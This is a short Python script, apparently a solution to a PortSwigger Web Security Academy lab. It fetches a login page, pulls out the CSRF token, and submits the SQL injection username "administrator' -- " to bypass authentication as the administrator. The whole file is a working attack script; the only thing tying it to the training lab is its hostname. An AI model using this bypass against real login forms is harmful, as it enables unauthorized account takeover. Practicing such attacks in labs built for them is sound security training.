import requests
from bs4 import BeautifulSoup

site = "0a1600350478869f80236cac00b00033.web-security-academy.net"  # <-- Replace with your site
s = requests.Session()
url = f'https://{site}/login'

resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : """administrator' -- """,
    'password' : """foo"""
}

resp = s.post(url, data=logindata)

soup = BeautifulSoup(resp.text,'html.parser')

if warn := soup.find('p', {'class':'is-warning'}):
    print(warn.text)
else:
    print(resp.text)
